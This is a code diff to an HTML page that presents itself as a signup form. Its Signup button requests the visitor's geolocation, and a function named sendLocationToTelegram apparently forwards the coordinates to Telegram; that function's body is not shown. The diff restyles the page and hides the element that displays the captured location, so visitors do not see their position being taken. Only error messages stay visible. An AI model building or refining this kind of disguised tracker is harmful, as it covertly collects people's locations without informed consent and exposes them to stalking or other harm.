@@ -7,18 +7,23 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            background-image: url('butterflyposter.png'); /* Use the butterflyposter.png as background */
+            background-size: cover; /* Ensure the background covers the entire page */
+            background-repeat: no-repeat; /* Prevent the background from repeating */
+            background-position: center; /* Center the background image */
         }
 
         #signup-form {
-            background-color: #fff;
+            background-color: rgba(255, 255, 255, 0.9); /* Semi-transparent white background */
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px; /* Limit the width for better readability */
         }
 
         h1 {
@@ -29,6 +34,8 @@
 
         label {
             font-weight: bold;
+            display: block; /* Ensure labels are on separate lines */
+            margin-bottom: 5px;
         }
 
         input[type="text"],
@@ -56,6 +63,7 @@
 
         #location {
             margin-top: 15px;
+            display: none; /* Hide the location element */
         }
     </style>
 </head>
@@ -74,7 +82,7 @@
 
             <button type="button" onclick="getLocation()">Signup</button>
 
-            <p id="location"></p>
+            <p id="location"></p> <!-- Location will not be shown due to display: none -->
         </form>
     </div>
     
@@ -84,6 +92,7 @@
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else {
                 document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
+                document.getElementById("location").style.display = "block"; // Show the message if geolocation is not supported
             }
         }
         
@@ -94,20 +103,23 @@
         }
 
         function showError(error) {
+            var message;
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    document.getElementById("location").innerHTML = "User denied the request for Geolocation.";
+                    message = "User denied the request for Geolocation.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    document.getElementById("location").innerHTML = "Location information is unavailable.";
+                    message = "Location information is unavailable.";
                     break;
                 case error.TIMEOUT:
-                    document.getElementById("location").innerHTML = "The request to get user location timed out.";
+                    message = "The request to get user location timed out.";
                     break;
                 case error.UNKNOWN_ERROR:
-                    document.getElementById("location").innerHTML = "An unknown error occurred.";
+                    message = "An unknown error occurred.";
                     break;
             }
+            document.getElementById("location").innerHTML = message;
+            document.getElementById("location").style.display = "block"; // Show the error message
         }
 
         function sendLocationToTelegram(latitude, longitude) {
